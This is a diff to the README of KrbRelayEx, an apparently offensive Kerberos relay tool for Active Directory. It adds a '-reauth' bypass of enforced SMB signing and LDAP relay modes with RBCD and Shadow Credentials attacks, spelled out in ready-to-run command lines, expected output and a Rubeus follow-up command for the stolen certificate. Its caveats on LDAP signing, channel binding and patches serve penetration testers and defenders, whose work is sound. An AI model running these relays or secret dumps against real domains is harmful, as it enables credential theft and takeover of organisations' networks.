@@ -31,6 +31,8 @@ Building upon the concept, I started from the great [KrbRelay](https://github.co
 ## Features  
 
 - Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.  
+- **Relay to targets that enforce SMB signing** by re-authenticating the reflected ticket on a session opened with known credentials (`-reauth`).  
+- **LDAP relay** over 389/TCP (or LDAPS with `-ssl`, StartTLS with `-ldapstarttls`) with built-in **RBCD** and **Shadow Credentials** attacks, implemented on a managed LDAP client so it runs on Windows and GNU/Linux alike. See the LDAP caveats before use.  
 - Interactive or background **multithreaded SMB consoles** for managing multiple connections, enabling file manipulation and the creation/startup of services.  
 - **Multithreaded port forwarding** to forward additional traffic from clients to original destination such as RDP, HTTP(S), RPC Mapper, WinRM,...
 - Transparent relaying process for **seamless user access**.  
@@ -51,6 +53,12 @@ Building upon the concept, I started from the great [KrbRelay](https://github.co
 
 - **Background Consoles**:  
   These are ideal for managing multiple SMB consoles simultaneously.  
+
+- **Servers that enforce SMB signing**:  
+  By default a relayed AP-REQ cannot be used against a server that requires SMB signing, because the relayed client never negotiated a session key we know. With `-reauth <DOMAIN/user:password>`, KrbRelayEx first opens a base SMB session with a low privileged account of your choice (deriving its signing key), and then sends the reflected AP-REQ as a **re-authentication on that same session**. The server accepts the identity switch but keeps signing with the key we already hold, so the privileged session remains usable. See the dedicated example below.
+
+- **LDAP is a different story (please read)**:  
+  The `-reauth` trick does **not** transfer to LDAP. On a domain controller that requires **LDAP signing** (`LdapServerIntegrity=2`, the default for new forests), the relayed bind is accepted but every operation that follows is silently dropped: the session expects SASL-signed records, and signing them requires the victim's Kerberos session key, which a relayed ticket does not provide. Enforcing **channel binding** additionally rejects relayed tickets over TLS (`SEC_E_BAD_BINDINGS`, `0x80090346`). LDAP relay is therefore usable only against DCs where signing is not enforced, and `-ssl`/`-ldapstarttls` will not help there. The known LDAP signing bypass (SpecterOps, October 2026) is **NTLM-based**, requires stacking the bind and the operation inside a single SASL-signed record, and was fixed by KB5126646 — it is not implemented in this tool.
 
 ## Blog
 In this [post](https://decoder.cloud/2024/11/26/group-policy-nightmares-pt2/), I describe the use case that led me to develop this tool.
@@ -78,17 +86,26 @@ SMB Attacks:
   -list                          List available SMB shares on the target system
   -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
   -secrets                       Dump SAM & LSA secrets from the target system
+  -reauth <DOMAIN/user:pass>     Bypass enforced SMB signing: open a base SMB session with these
+                                 credentials, then re-authenticate the reflected ticket on it
 
 HTTP Attacks:
   -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., `CertSrv`)
   -adcs <TEMPLATE>               Generate a certificate using the specified template
 
+LDAP Attacks:
+  -rbcd <COMPUTER>               Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
+  -rbcdsid <SID|ACCOUNT>         Principal granted delegation rights in the RBCD descriptor
+  -shadowcred <ACCOUNT>          Add a KeyCredential to msDS-KeyCredentialLink of the target account
+
 Options:
   -redirectserver <IP>           Specify the IP address of the target server for the attack
-  -ssl                           Use SSL transport for secure communication
+  -ssl                           Use SSL transport for secure communication (LDAPS 636 for LDAP relays)
   -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
   -redirectports <PORTS>         Comma-separated list of additional ports to forward (e.g., `3389,135,5985`)
   -smbport <PORT>                Specify the SMB port to listen on (default: 445)
+  -ldapstarttls                  Upgrade the LDAP relay connection to TLS on 389 before binding
+  -ldapdebug                     Hex dump every LDAP frame sent and received
 
 IMPORTANT: Ensure that you configure the entries in your hosts file to point to the actual target IP addresses!
 ```
@@ -122,6 +139,74 @@ From here, we can:
 - Write to protected locations with Domain Admin privileges.
 - Create and start services that run under the LOCAL SYSTEM context.
  - And much more... 😉
+
+SMB Relay against a server that enforces SMB signing (reauth):
+================================================================
+Most hardened member servers and domain controllers require **SMB signing**. A relayed AP-REQ cannot be used directly in that case: the ticket carries a session key negotiated between the real client and the KDC, so we are unable to sign the requests that follow the bind, and the server rejects the login.
+
+KrbRelayEx can work around this by re-authenticating the reflected ticket on top of a session whose key we already know:
+
+1. A low privileged account of your choice is used to open a **base SMB session** to the target (`-reauth`). Because we authenticated with a password, we know that session's signing key.
+2. The reflected AP-REQ (belonging to the privileged victim) is then sent as an **SMB2 re-authentication on that same session** (`SESSION_SETUP` on the existing `SessionID`, signed with the base key).
+3. Vulnerable targets accept the identity switch but **do not re-derive the signing key**, so the session keeps signing with the key we hold: the session is now the victim's, and we can operate on it.
+
+```powershell
+KrbRelayEx.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host> -reauth MYLAB.LOCAL/user1:Passw0rd!
+```
+
+Expected output:
+
+```plaintext
+[*] KrbRelayEx started
+[*] reauth enabled: base SMB session as MYLAB.LOCAL\user1 before re-authenticating the reflected ticket
+...
+[*] MiTMServer [...]: Got AP-REQ for : cifs/target.domain.com
+[*] reauth: opening base SMB session as MYLAB.LOCAL\user1
+[+] reauth: base session established, low privileged signing key derived
+[*] reauth: reflected cross-user re-authentication status: STATUS_SUCCESS (0x00000000)
+[+] reauth: privileged session verified against IPC$ (signing with the low privileged key)
+```
+
+Notes:
+
+- The account only needs to be able to authenticate to the target over SMB; it does not need any privilege. Its password is sent to the target during the base NTLM login.
+- If the re-authentication returns `STATUS_ACCESS_DENIED (0xC0000022)` the target is patched (the same-user re-authentication check shipped in the September 2026 updates), or the base account is not allowed to log on to that server.
+- The switch applies to `CIFS` relays only and is ignored for HTTP/ADCS.
+
+LDAP Relay (RBCD / Shadow Credentials):
+=======================================
+KrbRelayEx can relay the captured AP-REQ to a domain controller over LDAP and use the resulting identity to perform LDAP operations. The LDAP client is fully managed (no `wldap32`), so it works on both Windows and GNU/Linux; it also includes a minimal ticket inspector that prints the service principal the captured AP-REQ was issued for.
+
+```powershell
+# Shadow Credentials: add a KeyCredential to the target account and print the certificate to use
+KrbRelayEx.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -shadowcred victim-pc
+
+# RBCD: let an attacker-controlled computer account delegate to the target computer
+KrbRelayEx.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -rbcd victim-pc -rbcdsid EVILPC$
+
+# LDAPS on 636, or StartTLS on 389, when the DC wants an encrypted channel
+KrbRelayEx.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -ssl
+KrbRelayEx.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -ldapstarttls
+
+# Pre-authenticate with an account before re-binding the ticket, and dump every LDAP frame
+KrbRelayEx.exe -spn LDAP/dc.domain.com -redirecthost <ip_dc> -reauth MYLAB.LOCAL/user1:Passw0rd! -ldapdebug
+```
+
+Expected output:
+
+```plaintext
+[*] MiTMServer [...]: Got AP-REQ for : ldap/dc.domain.com
+[*] ldap: connected to [<ip_dc>:389]
+[*] ldap: relayed ticket is for cifs/dc.domain.com@MYLAB.LOCAL
+[!] ldap: ticket service is 'cifs', not 'ldap' - the DC will reject it unless that SPN maps to the same account
+[*] ldap: relayed bind (GSS-SPNEGO) result: success (0)
+[+] ldap: authenticated as u:MYLAB\VICTIM$
+[*] ldap: naming context DC=mylab,DC=local
+[+] shadowcred: msDS-KeyCredentialLink written on CN=victim-pc,...
+    Rubeus.exe asktgt /user:victim-pc /certificate:... /password:"..." /getcredentials /show
+```
+
+**Important caveat.** The relayed bind can succeed on any DC, but the operations that follow only work if the DC does **not** require LDAP signing. With signing enforced, the DC accepts the bind and then silently ignores every operation, because the session expects SASL-signed records and signing them requires the victim's session key. With channel binding enforced, relaying over TLS is rejected outright (`SEC_E_BAD_BINDINGS`, `0x80090346`) — in that case use plaintext 389, not `-ssl`/`-ldapstarttls`. A relayed machine-account ticket for `cifs/<dc>` is accepted by the LDAP service when both SPNs belong to the same computer account, which is why the `cifs` ticket shown above can still bind.
 
 HTTP(s) ADCSRelay:
 ==================
@@ -164,5 +249,9 @@ The tool has been build with .Net 8.0 Framework. The Dotnet Core runtime for Win
 
 [Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
 <br>
-[Using MITM to Attack Active Directory Authentication Schemes](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf)
+[Using MITM to Attack Active Directory Authentication Schemes](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf)  
+<br>
+[reauthx](https://github.com/aas-n/reauthx) - the Python implementation of the SMB signing bypass that `-reauth` is modeled on
+<br>
+[Defeating Enforced SMB Signing](https://blackfield.ch/blog/defeating-enforced-smb-signing/) - background on the vulnerability and the Microsoft fix
 
